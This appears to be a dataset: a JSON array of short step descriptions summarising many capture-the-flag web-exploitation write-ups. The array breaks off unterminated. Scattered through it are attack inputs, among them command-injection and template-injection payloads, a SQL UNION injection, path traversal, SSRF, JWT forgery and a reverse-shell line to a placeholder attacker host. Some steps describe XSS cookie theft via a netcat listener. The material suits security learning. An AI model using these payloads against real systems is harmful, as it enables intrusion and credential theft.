[
    "Visited the website.",
    "Observed redirection to '/?file=wc.php'.",
    "Discovered the existence of 'checkpass.php'.",
    "Visited '/?file=checkpass.php'.",
    "Realized the page contained some secret potentially usable code.",
    "Discovered the password 'w0rdc0unt123'.",
    "Plugged the password ('w0rdc0unt123') from '$password' variable to the cookie.",
    "Accessed the webpage.",
    "Input the payload '; ls #'.",
    "Realized 'echo exec(...)' only returns the last line of the output.",
    "Used shell access to browse the file system.",
    "Identified notable shell script 'findaas' inside '/ctf'.",
    "Executed './findaas flag.txt' command.",
    "Attempted to read the flag using 'cat ./system/of/a/down/flag.txt'.",
    "Received permission denied error.",
    "Read the 'README' file.",
    "Found password 'csictf'.",
    "Switched to the user 'ctf'.",
    "Authenticated using the password 'csictf'.",
    "Executed 'cat ./system/of/a/down/flag.txt' command.",
    "Locate the route '/login' in the website source.",
    "Locate the route '/adminNames' in the website source.",
    "Visit the '/login' route.",
    "Observe the form to fill.",
    "Submit the form.",
    "Recognize that the 'username' has been rot13 encoded in the decoded JWT.",
    "Apply rot13 decoding on the 'admin' value.",
    "Intend to rot13 encode the value 'true'.",
    "Recognize that altering the 'admin' value requires the JWT secret.",
    "Navigate to the '/adminNames' route.",
    "Observe that it prompts a file download.",
    "Visit the GitHub URL.",
    "Decide to use the rot13-encoded version of a listed admin username.",
    "Examine the request route for '/adminNames'.",
    "Experiment with the '/getFile?file=...' route.",
    "Recognize that the '.env' file contains the JWT secret.",
    "Create a new token.",
    "Visit the '/admin' route.",
    "Recognize the need for an 'Authorization' header.",
    "Identify that the 'Authorization' header should contain a JWT.",
    "Send a GET request.",
    "Receive a response text.",
    "Decode the flagged text.",
    "Read the challenge description and requirements",
    "Study server.js",
    "Identify the conditions for file retrieval",
    "Note that spaces or slashes in the filename are not allowed",
    "Note that filename length must be five or less",
    "Note that only js, ts, cpp, c files are allowed",
    "Infer that the flag is inside a `flag.txt`",
    "Note that an array passed in 'file' GET parameter gets converted and concatenated into a string",
    "Note that comma separation is added between each element of the array in the string format",
    "Note that this method of passing an array satisfies the filename restrictions",
    "Note that '.' and 'js' need to be the last two elements of the array",
    "Note that this arrangement is necessary to pass the file type check",
    "Send a GET request to the server",
    "Include the parameter `/getFile?file[]=a&file[]=b&file[]=c&file[]=d&file[]=/../flag.txt&file[]=.&file[]=js` in the request",
    "Retrieve the flag from the server response",
    "The flag is `csictf{5h0uld_5tr1ng1fy_th3_p4r4ms}`",
    "Search the challenge description online",
    "Find a quote from Mr. Robot",
    "Access 'robots.txt'",
    "Visit the disallowed route",
    "Obtain the flag",
    "Access the website",
    "Decode the cookie using base64 decoding",
    "Encode new cookie value into base64",
    "Retrieve the flag",
    "Decipher that the JavaScript in the source code was obfuscated",
    "Note that the password for the portal is being checked by the script",
    "Translate the hex-encoded list, var _0x575c, into a more readable format",
    "Understand many calls to 'window' were made in the CheckPassword function",
    "Realize the calls to 'window' essentially represent 'window.localStorage.setItem'",
    "Combine all password parts into a single string",
    "Enter the combined password into the portal",
    "Access the URL",
    "Find the input box",
    "Enter a color",
    "Click the submit button",
    "Submit a CSS selector for a potential starting letter of the password",
    "Repeat for all potential starting letters",
    "Use iterative deepening",
    "Update the prefix",
    "Inject CSS through the input box",
    "Guess combinations of characters",
    "Reveal the entire password",
    "Analyze the server script running at the provided URL.",
    "Visit the URL with the payload '?icecream={{globals()}}'.",
    "Retrieve the cookie_secret value 'MangoDB'.",
    "Replace the original signed cookie with the new one generated.",
    "Reload the server script.",
    "Review the given PHP code.",
    "Understand what the code does.",
    "Notice that to match the value of 'hash' and 'target', the 'hash' param cannot equal '10932435112'.",
    "Realize that the sha1 hashes of 'hash' and 'target' will not match.",
    "Identify that the sha1 hash of '10932435112' starts with '0e...'",
    "Understand that any other sha1 hash starting with the same prefix will match the target.",
    "Realize the role of type juggling in this matching process.",
    "Identify hashes that start with the '0e' prefix.",
    "Retrieve the flag from the server.",
    "Followed the challenge description",
    "Researched the 'flask_caching' module",
    "Learned about python pickles",
    "Slept for half a second",
    "Sent a GET request to access the cache data",
    "Triggered the command execution on the server side",
    "Identified the CTF flag",
    "Confirm the challenge 'Gif2png' exists.",
    "Analyze a Python script.",
    "Identify the source code of the application.",
    "Focus on the command line subprocess interaction.",
    "Identify the specific line of code related to the command line subprocess interaction.",
    "Identify the critical line.",
    "Begin preparing an attack.",
    "Decide to exploit the RCE vulnerability.",
    "Intend to use the crafted payload as the filename of the uploaded gif file.",
    "Conduct an analysis on the resulting PNG file.",
    "Discover that the flag is written on the resulting PNG file.",
    "Perform the action of extracting the flag.",
    "Observe that the extracted flag is 'cybrics{imagesaresocoolicandrawonthem}'.",
    "Access the source URL",
    "Open the URL in a browser",
    "Search for the function addCaptcha() in the JavaScript code",
    "Identify the functionality of the addCaptcha() function",
    "Locate the loop() function within addCaptcha()",
    "Remove the loop() function from addCaptcha()",
    "Access the JavaScript console in the devtools",
    "Call the addCaptcha() function",
    "Repeat the previous substep 4 more times",
    "Locate the captcha boxes on the screen",
    "Click on a captcha box",
    "Repeat the previous substep 4 more times",
    "Locate the 'GET FLAG' button",
    "Click on the 'GET FLAG' button",
    "Verify if the flag is displayed on the screen",
    "Open the website 'very.uniquename.xyz:8880'",
    "Read the challenge hint",
    "Guess that language setting may be relevant to solve puzzle",
    "Deduce that the language might be Swedish",
    "Open the cURL tool",
    "Set the language headers to Swedish",
    "Execute the command 'curl -H \"Accept-Language: sv-SE\" very.uniquename.xyz:8880'",
    "Run the command 'curl -H \"Accept-Language: sv-SE\" very.uniquename.xyz:8880'",
    "Retrieve the flag 'dsc{1_l0v3_sw3d3n}'",
    "Open the link 'very.uniquename.xyz:2052'",
    "Observe the page showing logos of Xbox and Linux",
    "Change User-Agent to 'Linux' using a curl command",
    "Observe the result",
    "Notice the Linux logo is gone from the page",
    "Change User-Agent to 'Linux Xbox' using curl",
    "Receive the flag in the body of the returned page",
    "Open web browser.",
    "Enter the URL 'overly.uniquename.xyz:2095'.",
    "Open cURL.",
    "Locate the 'User-Agent' header in the HTTP request.",
    "Change the 'User-Agent' header to mimic a Google bot.",
    "Locate the 'Referer' header in the HTTP request.",
    "Set the 'Referer' header as 'google.com'.",
    "Locate the 'Content-Type' header in the HTTP request.",
    "Set the 'Content-Type' as 'application/json'.",
    "Open the body of the HTTP request.",
    "Review the error received.",
    "Review the second error received.",
    "Verify reception of the flag 'dsc{th15_15_w4y_t00_much_w0rk}'.",
    "Use combination of uppercase, lowercase, numbers, underscore, and curly braces for domain",
    "Define conditional statement",
    "Initialize certain variables with specific values if challenge is 'taxi union'",
    "Assign specific values to variables if challenge is 'Gate keeper'",
    "Enter while loop",
    "Iterate over every character in the domain",
    "Build up the 'payload'",
    "Send POST request to server",
    "Check if response contains 'check' string",
    "Check if guessed character is in password",
    "If it is not, continue loop with next character",
    "Continue script until full password is discovered",
    "Opened the given link",
    "Checked the network tab",
    "Sent a curl request",
    "Received a response",
    "Sent another curl request",
    "Received another response",
    "Decided to write a script to automate the process",
    "Obtained a sequence of hexadecimal values",
    "Concluded that they seemed to be MD5 hashes",
    "Decrypted the MD5 hashes",
    "The author sets up the environment to exploit the SQL Injection challenge.",
    "These parameters are set up to be manipulated later.",
    "The author sets a condition to set the parameters based on the specific challenge.",
    "If the condition is not met, the script continues iterating.",
    "In each iteration, the author forms SQL Injection payload.",
    "The characters from the 'domain' are progressively appended to the payload.",
    "The payload is sent to the target URL via POST request.",
    "A check is performed on the response text.",
    "The check is to see if the response text contains 'check'.",
    "If the check is successful, it indicates that the payload was able to pass through SQL Injection.",
    "A valid login has been achieved.",
    "The iterated character is added to the 'flag'.",
    "The 'flag' value updates with the successful character.",
    "The process is repeated until the end of the flag is found.",
    "Analyzed the source code of the web application",
    "Noticed that the output in the /login POST route has not been stringified",
    "Understood how objects are handled",
    "Inferred the username to be michelle",
    "Attempted to pass an object in place of password",
    "This makes password an object",
    "Understood that objects are converted",
    "Understood that converted attributes are comma separated",
    "Understood that 0 compared with 'michelle' returns true",
    "Executed a curl command to make a POST request",
    "Extracted the session cookie",
    "Used the session cookie to visit /flag",
    "Collected the flag",
    "Wrote a python script",
    "The script automates the process",
    "Visit the website.",
    "Discover the secret to be 'supersecret'.",
    "Create a JWT with 'username: admin'.",
    "Add the new JWT to the cookie.",
    "Impersonate an admin.",
    "Visit a non-existent route starting with '/admin/'.",
    "Trigger a 404 error page.",
    "Climb the Python MRO hierarchy.",
    "List all usable classes.",
    "Find the 'subprocess.Popen' class.",
    "Use the 'subprocess.Popen' class.",
    "Start a 'netcat' listener on your server.",
    "Gain a shell.",
    "List the directory.",
    "Find the file named 'flag.txt'.",
    "Connect to the URL http://jh2i.com:50000",
    "Change the User-Agent header in the request",
    "Send a GET request to the URL",
    "Modify the User-Agent",
    "Inspect the returned data",
    "Retrieve the flag",
    "Open a browser.",
    "Enter the given URL in the address bar.",
    "Open the developer tools on the browser.",
    "Navigate to the 'Sources' tab in the developer tools.",
    "Identify the JS file 'jquery.jscroll2.js'.",
    "Open 'line 1' of the 'jquery.jscroll2.js' JS file.",
    "Create a Python script to convert the hexadecimal values in the line to strings.",
    "Run the Python script.",
    "Analyze the functionality of the converted code snippet.",
    "Identify that the snippet converts a base64 string to ASCII and stores it in local storage under the key 'flag'.",
    "Launch terminal.",
    "Observe the output of the conversion command to obtain the flag.",
    "Open a web browser.",
    "Visit the URL: https://redpwn.net/",
    "Open the web browser.",
    "Press the 'Ctrl' key on the keyboard.",
    "While holding the 'Ctrl' key, press the 'U' key on the keyboard.",
    "Read the HTML source code.",
    "Access the content attribute of the identified meta tag containing the flag.",
    "Copy the value of the content attribute: 'flag{1nspector_g3n3ral_at_w0rk}'",
    "Visit the source URL provided for the challenge.",
    "Identify the challenge as a beginner SQL Injection challenge.",
    "Receive an alert from the website.",
    "Read the flag from the alert.",
    "Read the flag displayed in the alert.",
    "Identify that the 'member' field within the token object is currently set to 0.",
    "Navigate to the '/api/flag' endpoint using the modified token.",
    "Check for HTML input acceptance.",
    "Look at the JavaScript file in the webpage.",
    "Note that HTML tags are not allowed.",
    "Add the encoded payload to the URL.",
    "Set up a netcat listener on a local server.",
    "Capture incoming connections.",
    "Admin Bot visits the URL.",
    "XSS payload is executed.",
    "Capture the Admin Bot's cookies.",
    "Cookies are sent by the executed payload to the netcat listener.",
    "Extract the flag from the Admin Bot's cookies.",
    "Identify that the URL of the created webpage is a base64 encoded form.",
    "Observe that the JavaScript code prevents 'script' tags.",
    "Observe that only certain attributes are allowed for an element in the JavaScript code.",
    "Ensure the site URL in the payload is using HTTPS.",
    "Prevent Content Security Policy Bypassing.",
    "Generate a webpage with the XSS payload.",
    "Set up a simple Node.js server backend.",
    "Send the generated webpage URL.",
    "Send the URL to the 'admin bot'.",
    "Retrieve the flag stored in the intercepted cookie.",
    "Notice the keywords 'page' and 'upload' on the webpage",
    "Identify that these keywords are sourced from the author of the CTF challenge",
    "Identify a comment prompting the user to 'get the page'",
    "Visit 'http://web.zh3r0.ml:7777/?page=flag'",
    "Check if an 'upload' page exists",
    "Confirm the existence of the 'upload' page",
    "Create a PHP file named 'payload.php'",
    "Decide to print all file contents",
    "Search for the flag on the browser",
    "Base decision on receiving multiple 'flag' files",
    "Visit route '/?page=payload'",
    "Use the uploaded PHP file for the request",
    "Find a lot of printed information",
    "Find the flag 'zh3r0{h3y_d1d_y0u_upl04d_php_c0rr3ct1y???_84651320}'",
    "Start the challenge instance.",
    "Examine the login screen.",
    "Examine the main screen with book selections.",
    "Analyze JwtService.java.",
    "Analyze SecretGenerator.Java.",
    "Copy the JWT token from the payload.",
    "Obtain the 'userId' from the decoded information.",
    "Navigate to the 'controllers' directory.",
    "Examine the file UserController.java to identify any useful endpoints.",
    "Open Postman or a similar tool for sending HTTP requests.",
    "Navigate to the user creation interface on the site.",
    "Create a new user as the default user role is immutable.",
    "Send a request to obtain a list of all users.",
    "Prepare a PATCH request for the new user\u2019s role.",
    "Send the request to modify the new user's role to 'Admin'.",
    "Login using the credentials of the newly promoted 'Admin' user.",
    "Start the instance.",
    "Observe the site providing a link to the running instance.",
    "Test various SQL queries to deduce the type of database in use.",
    "Determine from the result that the site uses SQLite as its database.",
    "Execute the query '123' UNION SELECT name, sql, null from sqlite_master;--'.",
    "Review the results to list all tables.",
    "Retrieve the flag from the returned results.",
    "Started the instance on picoCTF.",
    "Analyzed the web page.",
    "Inspected the static resources of the web page.",
    "Concluded that the challenge involves XML External Entity (XXE) from the use of the `XXE` tag and the 'xmlDetailsCheckPayload.js' file.",
    "Inspected the index.html file.",
    "Identified the endpoint for the POST request.",
    "Clicked a button on the website.",
    "Crafted a malicious XML payload to exploit XXE.",
    "Prepared a `POST` request with the crafted XML payload.",
    "Sent the request to '<url_of_site>/data'.",
    "Received the server's response to the malicious `POST` request.",
    "Upload a file.",
    "Set the file extension as .tpl.",
    "Generate random content for the file.",
    "Submit the file for identification.",
    "Observe the uploaded file triggering a POST to /upload.php.",
    "Notice a redirection with 302 Found to /index.php.",
    "Confirm that the file content is displayed.",
    "Upload a different file.",
    "Submit the file for observation.",
    "Note the changes in the displayed content.",
    "Conduct experiments with different content.",
    "Observe the server's response.",
    "Conduct an investigation.",
    "Discover the templates_c folder.",
    "Use a payload to leak the source code of PHP.",
    "Discover the flag within the source code.",
    "Found paths /, /logout, /login, /forgotpassword.html, /admin, and /dashboard.",
    "Attempted to login with 'admin', 'admin' as username and password.",
    "Failed to login with the provided credentials.",
    "Connected to the database using the credentials from the JavaScript code.",
    "Examined the different database schemas and tables: accounts, config, env, innodb, sys, users.",
    "Found a flag in the 'users' schema.",
    "Discovered various other important details in other schemas.",
    "Used the AWS credentials found in the 'config' schema.",
    "Downloaded the contents of an Amazon S3 bucket.",
    "Cloned the GitHub repository.",
    "Examined the source code of the challenge present in the cloned repository.",
    "Checked for possible exploitations in the Java servlet.",
    "Downloaded the code for the app",
    "Examined the contents of the downloaded code",
    "Received npm install warnings during installation",
    "Checked npm audit for vulnerabilities",
    "Encountered an error due to permissions",
    "Examined server code",
    "Discovered the line 'const port = process.env.PORT || 80'",
    "Clarified how to start the app locally using a non-privileged port",
    "Noted the creation of a 'storage.db' file",
    "Opened the 'storage.db' file with a SQLite database reader",
    "Viewed the stored data",
    "Examined the application's source code",
    "Examined the 'index.js' file",
    "Examined the 'login.js' file",
    "Examined the 'logout.js' file",
    "Examined the 'signup.js' file",
    "Identified the 'unserialize()' function",
    "Determined that the function is used in the index route",
    "Identified the mistake in the test",
    "Intended to display the flag on the welcome page",
    "Generated the finalized payload",
    "Ensured the crafted session cookie matches the expected format used by the application",
    "Successfully retrieved the flag",
    "Identify the app as a page.",
    "Download the source code.",
    "Identify the app as a Node.js app.",
    "Identify the app as a TypeScript app.",
    "Identify the app as written with Next JS.",
    "Spot the 'auth.ts' file.",
    "Identify a handler function within the file.",
    "Identify the functionality of storing the request body object into a database.",
    "Notice the requests being made to the API endpoint.",
    "Discover the 'schema.prism' file.",
    "Identify the 'User' model within the file.",
    "Identify the 'isAdmin' field within the 'User' model.",
    "Identify the default value of 'false' for the 'isAdmin' field.",
    "Set the 'isAdmin' field to 'true' in the request body.",
    "Identify the application as a WordPress site.",
    "Discover clickable links that reveal 2 blog posts.",
    "Find the blog post page '?p=1'.",
    "Note that we can leave a comment on this page.",
    "Notice that comments need to be approved.",
    "Observe the change in the URL after submitting a comment.",
    "Decide to examine the source code.",
    "Use an Integrated Development Environment (IDE) for examination.",
    "Identify suspicious JavaScript named 'mec-frontend'.",
    "Observe two <link> tags.",
    "Note that they appear unusual.",
    "Identify 'mec' as relating to a WordPress Plugin.",
    "Identify the first exploit.",
    "Determine that it is unusable due to requiring authentication.",
    "Try the second exploit.",
    "Find it to be ineffective.",
    "Accessed the site.",
    "Attempted to list the contents of '/etc/passwd'.",
    "Failed to open a reverse shell.",
    "Attempted '127.0.0.1;ls .' in the URL.",
    "Only 'index.php' was returned from the directory listing.",
    "Used '127.0.0.1;echo $PWD' in URL.",
    "Used '127.0.0.1;env' in URL.",
    "Found no useful information.",
    "Tried '127.0.0.1;ls /root' in URL.",
    "No output was returned.",
    "Used 'bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1' as a command.",
    "Attempted opening a webshell.",
    "Failed to get a reverse shell.",
    "Restarted the container.",
    "Caused problems.",
    "Searched for the flag using 'ls /'.",
    "Revealed a 'flag.txt' file.",
    "Used the command 'cat /flag.txt' as part of the URL parameter.",
    "Observe the name of the challenge.",
    "Observe the text of the challenge that refers to 'robots'.",
    "Identify the disallowed path '/g00d_old_mus1c.php'.",
    "Open the '/g00d_old_mus1c.php' path.",
    "Reveal the flag by accessing the path.",
    "Observe that Baby Eval is a Node app.",
    "Analyze the source codes provided.",
    "Determine that the webpage is created by executing an eval from a payload query parameter or calling the directory() function.",
    "Understand that the goal of the CTF challenge is to fetch the environment variable 'flag'",
    "Observe that parentheses and some keywords are blocked.",
    "Find a JavaScript feature called Template Literals.",
    "Realize that Template Literals can be used to call functions without parentheses.",
    "Append the payload '?payload=directory`flag`' to the URL of the webpage.",
    "Conclude that the directory function receives an array with a single string 'flag' as an argument.",
    "Understand that by the function's design, it returns the value of the 'flag' environment variable.",
    "Interpret that 'b1' is initialized with a random number from 0-500.",
    "Interpret that 'b2' is initialized with a random number from 0-500.",
    "Understand that the app listens to 'POST' requests.",
    "Identify that the requests are made to '/captcha'.",
    "Understand that if the expected value does not match 'solution'.",
    "Identify that the JWT field 'failed' is set to 'true'.",
    "Identify that a new CAPTCHA is generated.",
    "Realize that the flag can be attained with more than 1000 CAPTCHA solves.",
    "Understand the CAPTCHA generating code.",
    "Try out all remaining expected values.",
    "Identify the problem with brute force.",
    "Identify that the JWT expiry was not extended for failed solving attempts.",
    "Attempt to refactor the code.",
    "Limit the try range.",
    "Consider another solution.",
    "Visited the website.",
    "Confirmed command injection challenge.",
    "Recognized input appending pattern to '/santa_mon.sh'.",
    "Examined source code of 'santa_mon.sh' program.",
    "Noted execution of argument as command.",
    "Found 'ups_status' and 'restart_ups' commands return output from local web server.",
    "Checked output of 'List Processes' command and identified 'python3 /root/ups_manager.py'.",
    "Reviewed source code of 'config/ups_manager.py' revealing the HTTP server with endpoints for 'ups_status', 'restart_ups', and '/get_flag'.",
    "Enclosed payload in double quotes for PHP.",
    "Create an account on the website.",
    "Access the browser's developer tools.",
    "Copy the 'session' cookie.",
    "Decode the cookie using the selected tool.",
    "Gain access as an admin user.",
    "Access the browser's developer tools.",
    "Gain admin access.",
    "The website is a simple login page.",
    "Inspect the source code of the website.",
    "Verify the obtained credentials: `manager:bigsanta!` and `admin:tryharder`.",
    "Try logging in using `manager:bigsanta!` credentials.",
    "Try logging in using `admin:tryharder` credentials.",
    "Observe the post-login page.",
    "Identify a list of toys and some other properties.",
    "Inspect the `challenge/routes/index.js` file.",
    "Realize that logging in as admin is necessary to access the flag.",
    "Attempt using various SQL injection payloads on the login page.",
    "Log in using the working payload and reveal the hidden flag: `HTB{1nj3cti0n_1s_in3v1t4bl3}`.",
    "Examine the 'challenge/index.js' file in the source code zip.",
    "We cannot reach the '/queries' endpoint as the IP address required is 127.0.0.1, any other IP is redirected to '/'.",
    "Inspect 'challenge/bot.js' to understand 'bot.readQueries(db)' function. It reveals that the bot imports puppeteer, a headless browser controlled via JavaScript, holds the flag, loads the application home page, sets the 'flag' cookie, visits the '/queries' endpoint, and then exits.",
    "We need an actively running server to receive this request and log the cookie.",
    "We run this server on all interfaces '0.0.0.0' on port '16361'.",
    "Create account at ngrok, download the application, and login.",
    "Start the Flask python server with 'python xss-cookie-stealer.py' and then run '/ngrok http 16361'.",
    "Finally, input the payload into the frontend for the application.",
    "Visit an online barcode generator website.",
    "Navigate to the bottom of the results.",
    "Analyze the website.",
    "Discover it is running on Flask.",
    "Review the input form logic.",
    "Identify that eval() function is vulnerable.",
    "Realize it can be used to execute shell commands from within Python.",
    "Submit the payload through the form.",
    "Receive the output displaying the flag.",
    "Examine GitHub repo linked in the challenge",
    "Confirm that the repo belongs to a user named Magpie Inc",
    "Find the source code file 'flagchecker.c' in the repo",
    "Analyze the source code of 'flagchecker.c'",
    "Navigate to the '.github/workflows' directory",
    "Open the 'build.sh' script referenced in the GitHub Actions file",
    "Identify the 1st command-line argument used as a value assigned to a macro",
    "Study the commit history",
    "Find a commit with the message 'Fix auth!!!'",
    "Use the previously hardcoded auth cookie value",
    "Access the website.",
    "Attempt to read the required file.",
    "Define sections of the path to the flag.",
    "Read the flag.",
    "View the LOG data.",
    "Ensure that `$to_check` is assigned the value `0`.",
    "Create a 8 byte file equivalent to the data in `cipher + 0xd34db33f`.",
    "Upload the created file.",
    "Check if the XOR result is zero.",
    "Evaluate the if statement `0 == 'whatever the password is'`.",
    "The if statement evaluates to true.",
    "Echo back the flag.",
    "Examine the render function",
    "Pass things in the textbox",
    "Input {{ state.flag }}",
    "Get the flag",
    "Search for comments within the HTML source code",
    "Locate the style.css file within the website files",
    "Open the style.css file",
    "Search for comments within the style.css file",
    "Identify the second part of the flag within a comment",
    "Install and open Dirb tool",
    "Access the specified path in the website",
    "Identify the third part of the flag within the file contents",
    "Take the first part of the flag from step 2",
    "Take the second part of the flag from step 3",
    "Take the third part of the flag from step 5",
    "Combine all three parts of the flag together",
    "Enter the website.",
    "Type a random base username and password for the login.",
    "See a page notifying about an incorrect login.",
    "Suggest to visit recently acquired companies.",
    "Visit the robots.txt page for the site.",
    "Find a message about using an unsupported browser, more specifically Internet Explorer 6.01.",
    "Acquire the User-Agent string for Internet Explorer 6.01.",
    "Change the browser's user agent to IE 6.01 through developer tools in the browser.",
    "Reload the website page with the new user-agent.",
    "Identify the 'secret key' for the site's cookies: flour_sugar_chocolate_and_lotsalove.",
    "Go to 'Inspect' -> 'Storage' -> 'Cookies'.",
    "Get the cookie's value.",
    "Decode the session data from the cookie using Base64 decoding on a site like cyberchef.",
    "Identify that you need change the 'admin' field to 'true'.",
    "Note that you need the secret key due to Flask's hash based on session data, timestamp, and the secret key.",
    "Access the site and find the flag.",
    "Inspect the cookie.",
    "Identify the 'admin' field and its value.",
    "Change the value of the 'admin' field to 'true'.",
    "Get redirected to the flag page.",
    "Open the webpage in a web browser",
    "Open the inspection tools in the web browser",
    "Navigate to the sources tab in the inspection tools",
    "Locate and open the JavaScript file",
    "Find the desired location in the JavaScript file",
    "Set a breakpoint at the desired location",
    "Reload or refresh the webpage",
    "Verify that the flag animation is frozen",
    "Identified that 'Cheap' can be bought by entering a valid credit card.",
    "Attempted to purchase 'flag' but failed.",
    "Noticed that three successful purchases of 'cheap' had the same prefix.",
    "Observed that the prefix changed in the unsuccessful purchase.",
    "Deduced that the suffix of 'c1' and 'cp1' are the same.",
    "Inferred that the suffixes contain information about the product name and the purchase status.",
    "Attempted to decode the data contents.",
    "Unsuccessful in decoding the data contents.",
    "Combined portions of failed and successful purchase data strings.",
    "The brute-force attack was successful.",
    "Visited the URL provided by the successful attack and obtained the flag.",
    "Directory wasn't directly browsable or clonable",
    "Inspected the 'flag.php' file and its history",
    "Analyzed the source code for potential flaws",
    "Realized the asserts in 'index.php' were in strings",
    "Indicated potential 'eval' being done on the string",
    "Caused the source of 'flag.php' file to be revealed",
    "Acknowledged that one should never let user input be 'eval'ed in any way",
    "Plan to obtain information from MySQL special tables",
    "Attribute the difficulties to browser extension issues",
    "Obtain all entries in a column as a single row",
    "Test each column value",
    "Obtain table names from information_schema.tables",
    "Obtain column names from information_schema.columns",
    "Execute a final SQL query",
    "Retrieve the flag from the 'flag' column in the 'flag' table",
    "Identify that the login site is vulnerable to SQL injection",
    "Realize that the login site has filters applied to the quotation marks",
    "Identify that the flag was formed by computing the MD5 hash of the username, password and a salt",
    "Log in again with the deduced password to get the flag",
    "Visited the challenge link",
    "Executed the cURL command",
    "Sent the POST request",
    "Received the response",
    "Extracted the jwt token from the response",
    "Decrypted the jwt token using jwt.io",
    "Obtained the payload from the decrypted jwt token",
    "Noted the payload as {'user':'guest'}",
    "Constructed a POST request to the '/flag' endpoint",
    "Sent the POST request",
    "Received the response",
    "Analyzed the response",
    "Passed the earlier jwt token as parameter",
    "Received the response",
    "Analyzed the response",
    "Identified the need for admin credentials",
    "Edited the existing jwt token",
    "Changed the payload to {'user':'admin'} using jwt.io",
    "Constructed a POST request to the '/flag' endpoint",
    "Sent the POST request",
    "Received the response",
    "Open the provided challenge link",
    "Submit the form with random user credentials",
    "Observe the website redirection to '/flag'",
    "Read the message displayed: 'Not admin, no flag for you'",
    "Check the cookies of the webpage",
    "Find a 'token' key in the cookies",
    "Verify that the 'token' key contains a JWT",
    "Go to jwt.io",
    "Understand the requirement of a private and public key",
    "Access '/robots.txt' on the website",
    "Locate the private key",
    "Create a token",
    "Apply the signature to the token",
    "Build the token using NodeJS",
    "Use the 'jsonwebtoken' library",
    "Set the 'user' payload to 'admin'",
    "Use the retrieved private key for signing",
    "Specify the 'RS256' algorithm for signing",
    "Navigate to /flag",
    "Read the presented flag",
    "Read the challenge description.",
    "Logged in with a random value.",
    "Inspected cookies.",
    "Realised that the token was using the RS256 algorithm.",
    "Concluded that a JWT confusion attack is required.",
    "Identified the need to change the Asymmetric Cipher Algorithm to Symmetric Cipher Algorithm.",
    "Used the public key as a secret for the HMAC token.",
    "Crafted a token with 'admin' as the user.",
    "Used the crafted token as a cookie.",
    "Attempted to access the /flag directory.",
    "Successfully obtained the flag.",
    "Enter junk value to log in.",
    "Inspect browser cookies.",
    "Open jwt.io website.",
    "Enter token value.",
    "Verify token using jwt.io.",
    "Identify the algorithm used as HS256.",
    "Analyze the weak encryption.",
    "Open jwt_tool.",
    "Specify 'rockyou.txt' as the dictionary file.",
    "Retrieve the found secret_key 'redraider'.",
    "Create a new token using HS256 algorithm.",
    "Set secret_key as 'redraider'.",
    "Assign user value as 'admin'.",
    "Navigate to the /flag URL.",
    "Identify that the web application has registration, login, and readfile functionalities",
    "Perform a login using the web application",
    "Obtain a token after successful login",
    "Use the obtained token to perform a readfile operation",
    "Read the content of the `68696e742e747874` file, which is the hex representation of hint.txt",
    "Analyze the response from the previous step",
    "Apply the hashpumpy function to retrieve the contents of package.json",
    "Confirm that the password length is `22`",
    "Inspect the User.js file",
    "Discover the usage of `node-serialize` in User.js",
    "Examine the `decrypter` function",
    "Note the usage of the `unserialize` function",
    "Analyze the requirements for exploiting RCE",
    "Locate the .env file",
    "Utilize the developed exploit",
    "Analyze the URL 'http://35.207.189.79/pyserver/server.py'.",
    "Determine that the code has a vulnerable functionality.",
    "Identify that query parameters are not properly sanitized.",
    "Discover the requirement to login as an 'admin' user.",
    "Identify the need for a 'token' to perform certain actions.",
    "Examine the 'init_db' function.",
    "Inspect the server response.",
    "Search for the flag within the server response.",
    "Access the provided URL.",
    "Study the given codes on the page which are written in PHP.",
    "Realize that the potential path traversal vulnerability can be exploited.",
    "Understand that '../' is replaced in the code.",
    "Make several attempts to exploit the path traversal vulnerability.",
    "Decode the base64 string.",
    "Identify the first function that sets specific server response headers if the request is 127.0.0.1.",
    "Identify the second function that is used to proxy images.",
    "Extract the main execution function from the Python script.",
    "Note that 'Content-Type' is strictly checked in the header-setting function.",
    "Identify that '.jpg', '.png', and '.gif' extensions are blacklisted in the header-setting function.",
    "Select 'img/paperbots.svg' from the images provided by the server.",
    "Prepare a GET request to the URL 'http://35.207.189.79/api/proxyimage?url=http://127.0.0.1:8075/img/paperbots.svg'.",
    "Send the prepared GET request, making the server believe that the request is coming from the same host.",
    "Receive the server's response.",
    "Analyse the challenge",
    "Realize that a user can be registered",
    "Realize that the 'magic code' needed to login won't be received via email",
    "Use the URL 'http://35.207.189.79/api/login'",
    "Use the retrieved 'magic code' to complete the login",
    "Complete the login on the website",
    "Identify that a cookie is set after login",
    "Identify that the cookie is set with the flag '35C3_LOG_ME_IN_LIKE_ONE_OF_YOUR_FRENCH_GIRLS'",
    "Visit the given URL http://35.207.91.38/robots.txt.",
    "Observe a disallowed directory: /backup/.DS_Store.",
    "Visit http://35.207.91.38/backup/.DS_Store.",
    "Download the .DS_Store file.",
    "Use the script available at https://github.com/lijiejie/ds_store_exp.",
    "Extract hidden data from the .DS_Store file.",
    "Access the website.",
    "Specify the URL http://35.207.120.163.",
    "Access the website from the challenge.",
    "Submit a note.",
    "Include spaces in the note.",
    "Observe the error message.",
    "Submit a note.",
    "Receive a note ID.",
    "Receive a note PW.",
    "Receive a link to the note.",
    "Analyze the website's HTML.",
    "Find the comment indicating the source code location.",
    "Identify that the source code is located at /src.tgz.",
    "Download the source code.",
    "Study the downloaded source code.",
    "Find that the read endpoint is '/admin'.",
    "Find the code in 'view.php'.",
    "Understand that the code retrieves a note.",
    "Understand that the program only casts the integer part of 'id'.",
    "Craft the parameter as '5779715767432985082/../../admin'.",
    "Confirm the first 'if' statement would be passed.",
    "Confirm the second 'if' statement would be passed.",
    "Understand that PHP only considers the integer part of 'id' for the cast.",
    "Ensure the 'file_get_contents' instruction is used.",
    "Understand that it performs an HTTP GET call.",
    "Understand the interpretation of the GET call.",
    "Retrieve 'flag.txt'.",
    "Retrieve the flag.",
    "Access the initial webpage",
    "Observe a PHP snippet",
    "Analyze the PHP code for potential vulnerabilities",
    "Determine irrelevance of the first 'If' statement",
    "Find opportunity to bypass the second 'If' statement",
    "Use the same value for 'pass' URL parameter and User-Agent",
    "Exploit PHP's type conversion",
    "Approach the third 'If' statement",
    "Deduce the possible range of the value of $_[0]",
    "Identify 'b' as the character that successfully returns the flag",
    "Retrieve the flag '35c3_password_saltf1sh_30_seconds_max'",
    "Visited the challenge website",
    "Checked the source code of the homepage",
    "Found the first part of the flag 'accessdenied{1_w3nt_thr0ug' in an HTML comment",
    "Found a clue in the same comment to check 'd4rks0c1ety' page for the rest of the flag",
